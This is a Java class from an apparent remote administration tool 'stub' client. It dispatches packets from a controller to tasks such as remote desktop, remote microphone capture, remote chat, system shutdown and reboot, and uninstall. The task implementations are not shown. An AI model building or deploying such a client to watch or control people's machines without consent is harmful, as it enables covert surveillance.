package me.jershdervis.monitorj.stub.client;

import me.jershdervis.monitorj.stub.client.tasks.*;
import me.jershdervis.monitorj.stub.eventapi.EventManager;
import me.jershdervis.monitorj.stub.eventapi.EventTarget;
import me.jershdervis.monitorj.stub.eventapi.events.EventReceivePacket;

import java.io.IOException;
import java.util.ArrayList;

/**
 * Created by Josh on 19/06/2015.
 */
public class PacketTaskManager {

    private ArrayList<PacketTask> packetTasks = new ArrayList<PacketTask>();

    /**
     * Loads pre-set packets
     * TODO: Could possibly use reflection to load all packets in unique package on runtime
     */
    public PacketTaskManager() {
        EventManager.register(this);

        this.addPacketTask(new PingTask());

        this.addPacketTask(new RestartClientApplicationTask());
        this.addPacketTask(new DisconnectClientTask());
        this.addPacketTask(new ShutdownClientApplicationTask());
        this.addPacketTask(new UninstallClientApplicationTask());

        this.addPacketTask(new SleepClientSystemTask());
        this.addPacketTask(new LogoffClientSystemTask());
        this.addPacketTask(new RebootClientSystemTask());
        this.addPacketTask(new ShutdownClientSystemTask());

        this.addPacketTask(new RemoteDesktopStartTask());
        this.addPacketTask(new RemoteDesktopStopTask());

        this.addPacketTask(new RemoteMicStartTask());
        this.addPacketTask(new RemoteMicStopTask());

        this.addPacketTask(new RemoteChatStartTask());
        this.addPacketTask(new RemoteChatStopTask());
        this.addPacketTask(new RemoteChatMessage());
    }

    /**
     * Called when a packet is received.
     * This method determines the correct response that should be taken
     * @param event
     */
    @EventTarget
    public void onReceivePacket(EventReceivePacket event) {
        for(PacketTask task : packetTasks) {
            if(event.getPacketID() == task.getPacketID()) {
                try {
                    task.run(event.getClient());
                    System.gc();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    /**
     * Adds a PacketTask to the list of reactive Tasks when a Packet is received
     * @param packetTask
     */
    public void addPacketTask(PacketTask packetTask) {
        this.packetTasks.add(packetTask);
    }

    /**
     * Gets an ArrayList of set PacketTask objects
     * @return
     */
    public ArrayList<PacketTask> getPacketTasks() {
        return this.packetTasks;
    }
}
